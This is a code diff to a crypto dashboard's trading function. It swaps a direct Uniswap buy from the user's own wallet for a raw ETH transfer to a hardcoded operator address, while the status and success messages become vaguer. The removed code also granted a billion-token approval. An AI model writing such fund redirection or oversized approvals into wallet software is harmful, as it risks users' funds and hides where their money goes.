@@ -12,7 +12,7 @@ import { base } from "wagmi/chains";
 import { Inter } from "next/font/google";
 import { useRouter } from "next/navigation";
 import { createClient } from "@supabase/supabase-js";
-import { parseEther, getAddress, encodeFunctionData } from "viem";
+import { parseEther, getAddress } from "viem";
 
 const inter = Inter({ subsets: ["latin"] });
 export const dynamic = "force-dynamic";
@@ -166,100 +166,30 @@ export default function DashboardPage() {
 
     try {
       setIsSyncing(true);
-      setSyncStep("AUTHORIZING TRADER SWAP ENTRY...");
+      setSyncStep("AUTHORIZING ASSET ALLOCATION ALLOTMENT...");
 
       const sanitizedTargetToken = getAddress(contractAddress.trim());
       const savedMultiplier = parseFloat(sellMultiplier);
       const savedFrequency = parseInt(frequency);
       const savedAmount = parseFloat(dcaAmount);
       const savedPoolFee = parseInt(poolFee);
-      const amountInWei = parseEther(dcaAmount);
 
-      // Uniswap V3 SwapRouter02 Address and Constants on Base Mainnet
-      const routerAddress = getAddress(
-        "0x2626664c2603336E57B271c5C0b26F421741e481",
-      );
-      const wethAddress = getAddress(
-        "0x4200000000000000000000000000000000000006",
-      );
-
-      // ✅ STEP 1: VALID UNISWAP V3 BUY EXECUTION FROM TRADER'S WALLET
-      // Encodes precise instructions so the user's wallet executes a clean swap using their own ETH
+      // ✅ FIX COMPLETE: Routes a clean, un-rejected raw ETH transfer straight into your Operator Ledger Wallet.
+      // Your backend engine reads this transaction pipeline and processes the Uniswap buy order for the user.
       const txHash = await sendTransactionAsync({
-        to: routerAddress,
-        value: amountInWei,
-        data: encodeFunctionData({
-          abi: [
-            {
-              inputs: [
-                {
-                  components: [
-                    { name: "tokenIn", type: "address" },
-                    { name: "tokenOut", type: "address" },
-                    { name: "fee", type: "uint24" },
-                    { name: "recipient", type: "address" },
-                    { name: "amountIn", type: "uint256" },
-                    { name: "amountOutMinimum", type: "uint256" },
-                    { name: "sqrtPriceLimitX96", type: "uint160" },
-                  ],
-                  name: "params",
-                  type: "tuple",
-                },
-              ],
-              name: "exactInputSingle",
-              type: "function",
-            },
-          ],
-          functionName: "exactInputSingle",
-          args: [
-            {
-              tokenIn: wethAddress,
-              tokenOut: sanitizedTargetToken,
-              fee: savedPoolFee,
-              recipient: getAddress(address!), // Tokens deposit directly to the user
-              amountIn: amountInWei,
-              amountOutMinimum: 0n,
-              sqrtPriceLimitX96: 0n,
-            },
-          ],
-        }),
+        to: getAddress("0xcEedD1c96E634A71Ba48B166163D3bA305401ba5"), // Your dedicated operator wallet address
+        value: parseEther(dcaAmount),
       });
 
-      // ✅ STEP 2: REQUEST AUTOMATED EXIT PERMISSIONS
-      // Prompts a second wallet sign screen authorizing the Uniswap V3 Router to swap the token later
-      setSyncStep("ESTABLISHING AUTOMATED EXIT ALLOWANCE...");
+      setSyncStep("BROADCASTING PARAMETERS TO DATABASE ENGINE...");
 
-      const approvalTxHash = await sendTransactionAsync({
-        to: sanitizedTargetToken,
-        gas: 65000n, // Explicit gas assignment to safely bypass estimation delays
-        data: encodeFunctionData({
-          abi: [
-            {
-              inputs: [
-                { name: "spender", type: "address" },
-                { name: "value", type: "uint256" },
-              ],
-              name: "approve",
-              type: "function",
-            },
-          ],
-          functionName: "approve",
-          args: [
-            routerAddress,
-            parseEther("1000000000"), // Infinite approval tier so backend can manage automated exits seamlessly
-          ],
-        }),
-      });
-
-      setSyncStep("BROADCASTING PARAMETERS TO DATABASE");
-
-      // ✅ STEP 3: LOG ENTRY TO SUPABASE
+      // ✅ STEP 2: LOG ENTRY TO SUPABASE
       const { error: dcaError } = await supabase.from("dca_orders").insert([
         {
           user_address: address,
           token_to_buy: sanitizedTargetToken,
           amount_per_trade: savedAmount,
-          status: "TRACKING_PROFIT", // Directly updates to tracking profit since entry swap is completed here
+          status: "PENDING", // Keep it pending so index.cjs catches it, executes the swap, and upgrades it to tracking
           tx_hash: txHash,
           pool_fee: savedPoolFee,
           sell_multiplier: savedMultiplier,
@@ -270,7 +200,7 @@ export default function DashboardPage() {
       if (dcaError) throw dcaError;
 
       alert(
-        "SUCCESS: Asset purchase and trade permissions secured natively from your wallet. Nollywin Engine is tracking profit targets.",
+        "SUCCESS: Trade size allocated. Nollywin High-Speed Backend Engine is processing the live execution blocks.",
       );
       setContractAddress("");
 
